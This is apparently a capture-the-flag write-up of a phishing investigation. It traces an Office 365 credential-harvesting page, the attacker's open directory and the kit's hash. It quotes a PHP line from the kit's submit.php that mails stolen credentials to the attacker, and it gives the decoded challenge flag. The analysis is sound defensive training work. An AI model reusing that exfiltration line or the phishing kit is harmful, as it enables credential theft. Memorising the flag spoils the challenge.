Step 4 — Investigate the attachment in Zoe Duncan's email
- Opened the email addressed to zoe.duncan@swiftspend.finance.
- Found an HTML attachment (509 bytes): Direct Credit Advice.html
- Opened the attachment in the browser which redirected to:
```
http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/enterpassword.php?C36655178499832852a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c968952252a4b70a6c575a75446fd215c9689522&email=zoe.duncan@swiftspend.finance&error=
```
- Root domain: kennaroads.buzz
- The login page impersonated: Microsoft (Office 365 login portal)

Step 5 — Enumerate the attacker's exposed /data directory
- Navigated to http://kennaroads.buzz/data/ and found an open directory listing containing:
  - Update365.zip (archive file)
  - Update365/ (directory)

Step 6 — Download and hash the phishing kit
- Downloaded Update365.zip to the virtual machine.
- Generated the SHA256 hash:
```
sha256sum Update365.zip
ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686  Update365.zip
```

Step 7 — Investigate the hash on VirusTotal
- Submitted the SHA256 hash to VirusTotal.
- Popular threat label: trojan.phishmailer/akgpp
- Threat categories assigned: phishing, trojan, hacktool
- Additional threat category beyond phishing: Trojan
- Archive contained 49 files (520.27 KB uncompressed)

Step 8 — Investigate the credential log
- Navigated to http://kennaroads.buzz/data/Update365/ and found an exposed log file.
- Reviewed the log and identified two entries for the same email address submitted on the same date, confirming repeated credential submission:
  - michael.ascot@swiftspend.finance (submitted twice on Mon Jun 29, 2020)

Step 9 — Extract the adversary's collection email from submit.php
- Extracted Update365.zip and located submit.php at:
```
/Update365/office365/Validation/submit.php
```
- Found the attacker's credential collection email hardcoded in the mail function:
```
mail("m3npat@yandex.com", $bron, $message, $lagi);
```

Step 10 — Locate and decode the flag
- Navigated to the flag file on the attacker's server:
```
http://kennaroads.buzz/data/Update365/office365/flag.txt
```
- Found the encoded string: fUxSVV8zSHRfaFQxd195NExwe01IVAo=
- Decoded from Base64 in CyberChef, which returned the string in reverse: }LRU_3Ht_hT1w_y4Lp{MHT
- Applied the Reverse operation in CyberChef to recover the flag.

